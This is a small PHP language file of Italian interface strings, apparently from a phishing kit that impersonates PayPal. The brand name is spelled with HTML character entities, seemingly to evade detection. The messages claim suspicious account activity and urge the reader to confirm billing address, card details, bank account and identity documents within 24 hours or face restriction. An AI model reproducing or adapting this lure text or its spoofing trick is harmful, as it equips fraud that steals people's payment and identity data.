<?php 
$log = "Disconnettersi";
$contact = "Contatto";
$feedback = "Risposta";
$privacy = "Vita privata";
$infottl = "&Rho;&#97;y&Rho;&#97;l Sicurezza";
$mo7 = "Che c'è? ?";
$mo8 = "&Rho;&#97;y&Rho;&#97;l te protegge contro i truffatori";
$mo9 = "Abbiamo il sospetto tua ultima attività.";
$mo10 = "Si dovrà passare attraverso le seguenti operazioni per ripristinare l'accesso all'account:";
$mo11 = "Confermare l'indirizzo di fatturazione.";
$mo12 = "Confermare le credito/debito dettagli della carta.";
$mo13 = "Allegare copia dei documenti richiesti.";
$mo14 = "Hai 24 ore per confermare la vostra identità, altrimenti sarà limitato.";
$mo19 = "Conferma il tuo conto bancario.";
$process = "Avviare il processo";
?>